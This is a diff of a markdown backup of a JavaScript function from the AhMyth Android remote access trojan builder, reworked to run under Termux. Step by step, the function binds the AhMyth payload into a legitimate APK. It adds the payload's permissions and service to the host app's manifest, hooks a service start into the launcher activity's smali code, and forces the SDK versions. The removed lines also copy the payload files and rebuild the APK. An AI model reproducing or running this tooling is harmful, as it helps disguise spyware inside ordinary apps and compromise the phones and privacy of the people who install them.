@@ -278,261 +278,148 @@ function GetLauncherActivity(manifest) {
 ## Backup Cross Platform Bind On Launch function
 Stored just in case of problems with the original Cross platform bind on launch function
 ```js
+const fs = require('fs-extra');
+const xml2js = require('xml2js');
+const path = require('path');
+const exec = require('child_process').exec;
+var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');
+const apkFolder = '/data/data/com.termux/files/home/flappy';
+
+var copyPermissions = (manifest) => {
+    // $appCtrl.copyPermissions = (manifest) => {
+    var firstPart = manifest.substring(0, manifest.indexOf("<application"));
+    var lastPart = manifest.substring(manifest.indexOf("<application"));
+
+    var permArray = CONSTANTS.permissions;
+    for (var i = 0; i < permArray.length; i++) {
+        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);
+        permissionName = permissionName.substring(0, permissionName.indexOf('"'));
+        if (firstPart.indexOf(permissionName) == -1) {
+            // Check if this is the first permission being added
+            if (firstPart.indexOf('uses-permission') == -1) {
+                firstPart = firstPart + "\n" + permArray[i];
+            } else {
+                // Add the permission above the first existing permission
+                var index = firstPart.indexOf('<uses-permission');
+                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);
+            }
+        }
+    }
+
+    return (firstPart + lastPart);
+};
+
 $appCtrl.BindOnLauncher = (apkFolder) => {
 
-
-    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
-    $appCtrl.Log();
+    console.log('[★] Finding Launcher Activity From AndroidManifest.xml...');;
     fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
         if (error) {
-            $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
-            $appCtrl.Log();
+            console.log('[★] Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
             return;
         }
 
-        var launcherActivity = GetLauncherActivity(data, apkFolder);
-        if (launcherActivity == -1) {
-            $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
-            $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
-            $appCtrl.Log();
-            return;
-        }
-
-        var ahmythService = CONSTANTS.ahmythService;
-        $appCtrl.Log('Modifying AndroidManifest.xml...');
-        $appCtrl.Log();
-        var permManifest = $appCtrl.copyPermissions(data);
-        var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
-        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
-            if (error) {
-                $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
-                $appCtrl.Log();          
+        xml2js.parseString(data, (err, result) => {
+            if (err) {
+                console.error(err);
                 return;
             }
-            
-            if (process.platform === 'win32') {
-                $appCtrl.Log("Locating Launcher Activity...")
-                $appCtrl.Log();
-                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
-                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
-                + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
-                var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
-                if (error !== null) {
-                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                    $appCtrl.Log();
+
+            var launcherActivity = GetLauncherActivity(result, apkFolder);
+            if (launcherActivity == -1) {
+                console.log("[★] Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
+                console.log("[★] Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);;
+                return;
+            }
+
+            var ahmythService = CONSTANTS.ahmythService;
+            console.log('[★] Modifying AndroidManifest.xml...');;
+            var permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
+            var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
+            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
+                if (error) {
+                    console.log('[★] Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);;
                     return;
-                } else if (!launcherPath) {
-                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                    $appCtrl.Log();
-                    return;
-                } else {
-                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
-                    $appCtrl.Log();
                 }
 
-                $appCtrl.Log("Reading Launcher Activity...")
-                $appCtrl.Log();
-                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
-                    if (error) {
-                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                        $appCtrl.Log();
-                        return;
+                if (process.platform === 'win32') {
+                    console.log("[★] Locating Launcher Activity...");
+                    exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"'
+                        + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"'
+                        + ' -file | resolve-path -relative', {
+                        'shell': 'powershell.exe'
+                    }, (error, stdout, stderr) => {
+                        var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
+                        if (error !== null) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else if (!launcherPath) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else {
+                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
                         }
 
-                        var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
- 
-                        var hook = CONSTANTS.hookPoint;
-                        $appCtrl.Log("Modifiying Launcher Activity...");
-                        $appCtrl.Log();
-                        var output = data.replace(hook, startService);
-                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                        console.log("[★] Reading Launcher Activity...");
+                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                             if (error) {
-                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                                $appCtrl.Log();
+                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
                                 return;
                             }
-                            
-                            $appCtrl.Log("Determining Target SDK Version...");
-                            $appCtrl.Log()
-                            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
-                              if (error) {
-                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
-                                $appCtrl.Log()
-                                return;
-                              }
-                              
-                              $appCtrl.Log("Modifying the Target SDK Version...");
-                              $appCtrl.Log();
-                              var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                              var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
-                              var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                              var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
-                              var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
-                              fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
-                                if (error) {
-                                    $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
-                                    $appCtrl.Log();          
-                                    return;
-                                  }
 
-                                  fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
+                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
+
+                            var hook = CONSTANTS.hookPoint;
+                            console.log("[★] Modifiying Launcher Activity...");;
+                            var output = data.replace(hook, startService);
+                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                                if (error) {
+                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
+                                    return;
+                                }
+
+                                console.log("[★] Determining Target SDK Version...");
+
+                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                                     if (error) {
-                                        $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
-                                        $appCtrl.Log();
+                                        console.log("[★] Reading the Manifest Target SDK Failed.")
+
                                         return;
                                     }
 
-                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
-                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
-                                    var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
-                                    fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
-                                      if (error) {
-                                          $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
-                                          $appCtrl.Log()
-                                          return;
+                                    console.log("[★] Modifying the Target SDK Version...");;
+                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
+                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
+                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
+                                        if (error) {
+                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
+                                            return;
                                         }
 
-                                        var regex = /[^/]+\//;
-                                        var str = launcherPath;
-                                        var m = str.replace(/\\/g, "/").match(regex);
-            
-                                        var smaliFolder = m[0];
-            
-                                        $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
-                                        $appCtrl.Log();
-                                        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
+                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                             if (error) {
-                                                $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
-                                                $appCtrl.Log();
+                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
                                                 return;
-                                              }
-                                              
-                                              $appCtrl.GenerateApk(apkFolder);
-                              
-                                          });
-                                          
-                                      });
-              
-                                  });
-              
-                              });
-
-                          });
-
-                      });
-
-                  });
-
-              });
-
-            } else {
-                (process.platform === "linux" || process.platfrom === "darwin")
-                $appCtrl.Log("Locating Launcher Activity...");
-                $appCtrl.Log();
-                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
-                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
-                + ' -file | resolve-path -relative', { 'shell':'pwsh' }, (error, stdout, stderr) => {
-                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
-                if (error !== null) {
-                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                    $appCtrl.Log();
-                    return;
-                } else if (!launcherPath) {
-                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                    $appCtrl.Log();
-                    return;
-                } else {
-                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
-                    $appCtrl.Log();
-                }
-
-                $appCtrl.Log("Reading Launcher Activity...")
-                $appCtrl.Log();
-                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
-                    if (error) {
-                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
-                        $appCtrl.Log();
-                        return;
-                    }
-
-                    var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
- 
-                    var hook = CONSTANTS.hookPoint;
-                    $appCtrl.Log("Modifiying Launcher Activity...");
-                    $appCtrl.Log();
-                    var output = data.replace(hook, startService);
-                    fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
-                        if (error) {
-                            $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
-                            $appCtrl.Log();
-                            return;
-                        }
-                        
-                        $appCtrl.Log("Determining Target SDK Version...");
-                        $appCtrl.Log()
-                        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
-                            if (error) {
-                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
-                                $appCtrl.Log()
-                                return;
-                            }
-
-
-                            $appCtrl.Log("Modifying the Target SDK Version...");
-                            $appCtrl.Log();
-                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
-                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
-                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
-                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
-                            var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
-                            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
-                            if (error) {
-                                $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
-                                $appCtrl.Log();          
-                                return;
-                                }
-
-                                fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
-                                if (error) {
-                                    $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
-                                    $appCtrl.Log();
-                                    return;
-                                }
-
-                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
-                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
-                                var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
-                                fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
-                                    if (error) {
-                                        $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
-                                        $appCtrl.Log()
-                                        return;
-                                    }
-
-                                    var regex = /[^/]+\//;
-                                    var str = launcherPath;
-                                    var m = str.match(regex);
-
-                                    var smaliFolder = m[0];
-            
-                                    $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
-                                    $appCtrl.Log();
-                                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
-                                        if (error) {
-                                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
-                                            $appCtrl.Log();
-                                            return;
                                             }
-                                            
-                                            $appCtrl.GenerateApk(apkFolder);
-                
-                                            });;
+
+                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
+                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
+                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
+                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
+                                                if (error) {
+                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
+
+                                                    return;
+                                                }
+
+                                                // $appCtrl.copyAhmythFilesAndGenerateApk
+
+                                            });
 
                                         });
 
@@ -546,13 +433,191 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 
                     });
 
-                });
+                } else if (process.platform === "linux") {
+                    console.log("[★] Locating Launcher Activity...");;
+                    exec('find -name "' + launcherActivity + '"', {
+                        cwd: apkFolder
+                    }, (error, stdout, stderr) => {
+                        var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
+                        if (error !== null) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else if (!launcherPath) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else {
+                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
+                        }
 
-            };
+                        console.log("[★] Reading Launcher Activity...");
+                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+                            if (error) {
+                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                                return;
+                            }
+
+                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
+
+                            var hook = CONSTANTS.hookPoint;
+                            console.log("[★] Modifiying Launcher Activity...");;
+                            var output = data.replace(hook, startService);
+                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                                if (error) {
+                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
+                                    return;
+                                }
+
+                                console.log("[★] Determining Target SDK Version...");
+
+                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+                                    if (error) {
+                                        console.log("[★] Reading the Manifest Target SDK Failed.")
+
+                                        return;
+                                    }
+
+                                    console.log("[★] Modifying the Target SDK Version...");;
+                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
+                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
+                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
+                                        if (error) {
+                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
+                                            return;
+                                        }
+
+                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
+                                            if (error) {
+                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
+                                                return;
+                                            }
+
+                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
+                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
+                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
+                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
+                                                if (error) {
+                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
+
+                                                    return;
+                                                }
+
+                                                // $appCtrl.copyAhmythFilesAndGenerateApk
+
+                                            });
+
+                                        });
+
+                                    });
+
+                                });
+
+                            });
+
+                        });
+
+                    });
+
+                } else {
+                    (process.platform === "darwin");
+                    console.log("[★] Locating Launcher Activity...");;
+                    exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
+                        var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
+                        if (error !== null) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else if (!launcherPath) {
+                            console.log("[★] Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                            console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                            return;
+                        } else {
+                            console.log("[★] Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);;
+                        }
+
+                        console.log("[★] Reading Launcher Activity...");;
+                        fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
+                            if (error) {
+                                console.log('[★] Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
+                                console.log('[★] Please use the "On Boot" Method to use This APK as a Template!', CONSTANTS.logStatus.INFO);;
+                                return;
+                            }
+
+                            var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
+
+                            var hook = CONSTANTS.hookPoint;
+                            console.log("[★] Modifiying Launcher Activity...");;
+                            var output = data.replace(hook, startService);
+                            fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
+                                if (error) {
+                                    console.log('[★] Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);;
+                                    return;
+                                }
+
+                                console.log("[★] Determining Target SDK Version...");
+
+                                fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
+                                    if (error) {
+                                        console.log("[★] Reading the Manifest Target SDK Failed.")
+
+                                        return;
+                                    }
+
+                                    console.log("[★] Modifying the Target SDK Version...");;
+                                    var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
+                                    var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
+                                    var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
+                                    var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/;
+                                    var repXmlSdk = data.replace(compSdkVerRegex, "$122" + '"').replace(compSdkVerNameRegex, "$111" + '"').replace(platVerCoRegex, "$122" + '"').replace(platVerNameRegex, "$111" + '"');
+                                    fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
+                                        if (error) {
+                                            console.log('[★] Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);;
+                                            return;
+                                        }
+
+                                        fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
+                                            if (error) {
+                                                console.log("[★] Modifying the 'apktool.yml' Target SDK Failed!");;
+                                                return;
+                                            }
+
+                                            var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
+                                            var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
+                                            var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
+                                            fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
+                                                if (error) {
+                                                    $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
+
+                                                    return;
+                                                }
+
+                                                // $appCtrl.copyAhmythFilesAndGenerateApk
+
+                                            });
+
+                                        });
+
+                                    });
+
+                                });
+
+                            });
+
+                        });
+
+                    });
+
+                };
+
+            });
 
         });
 
     });
-
 };
 ```
